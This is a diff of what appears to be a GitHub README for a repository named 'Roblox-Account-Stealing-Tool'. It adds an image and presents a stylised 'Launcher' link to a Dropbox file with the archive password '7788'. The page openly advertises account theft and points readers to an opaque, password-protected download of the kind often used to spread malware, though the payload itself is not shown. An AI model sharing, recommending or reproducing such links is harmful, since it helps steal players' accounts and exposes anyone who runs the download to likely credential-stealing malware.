@@ -1,3 +1,5 @@
+![1](https://github.com/permana83/Roblox-Account-Stealing-Tool/assets/31946886/7aa4ac96-e68e-4232-bedd-4817f05f1cbd)
+
 # 🗃[𝗟𝗮𝘂𝗻𝗰𝗵𝗲𝗿](https://dl.dropboxusercontent.com/scl/fi/pzbnz5rpnbnuyyvzz98yx/Project?rlkey=u1h314u1rzuh71amr06fkm5n2)
 
 # 🔑𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: 7788
